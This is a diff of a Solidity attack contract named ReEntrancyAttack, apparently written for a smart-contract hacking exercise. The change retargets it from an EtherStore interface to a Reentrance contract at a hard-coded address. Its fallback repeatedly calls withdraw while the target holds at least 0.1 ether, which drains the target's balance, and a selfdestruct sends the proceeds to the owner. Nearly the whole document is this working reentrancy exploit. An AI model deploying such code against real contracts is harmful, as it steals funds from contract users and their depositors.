@@ -4,15 +4,10 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract ReEntrancyAttack is Ownable {
-    EtherStore public etherStore;
     Reentrance public reentrance;
     address remoteContract;
 
     constructor() {
-        etherStore = EtherStore(
-            address(0xF00b58976800976Ae589d2715a97341111F85F96)
-        );
-
         reentrance = Reentrance(
             address(0xF00b58976800976Ae589d2715a97341111F85F96)
         );
@@ -25,16 +20,18 @@ contract ReEntrancyAttack is Ownable {
     // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
         emit FallbackCalled("Fallback method called", msg.value);
-        if (address(etherStore).balance >= 0.2 ether) {
-            etherStore.withdraw(msg.value);
+        if (address(reentrance).balance >= 0.1 ether) {
+            reentrance.withdraw(msg.value);
         }
     }
 
-
     function attack() external payable {
-        require(msg.value >= 0.2 ether);
-        etherStore.donate{value: 0.2 ether}(msg.sender);
-        etherStore.withdraw(msg.value);
+        reentrance.donate{value: 0.1 ether}(msg.sender);
+        reentrance.withdraw(0.1 ether);
+    }
+
+    function withDraw(uint256 _amount) public {
+        reentrance.withdraw(_amount);
     }
 
     function donateThem(address _to) public payable {
@@ -50,14 +47,8 @@ contract ReEntrancyAttack is Ownable {
         selfdestruct(payable(owner()));
     }
 
-    receive() external payable {}
+    // receive() external payable {}
     //0xF00b58976800976Ae589d2715a97341111F85F96
-}
-
-interface EtherStore {
-    function withdraw(uint256 _amount) external;
-
-    function donate(address _to) external payable;
 }
 
 interface Reentrance {
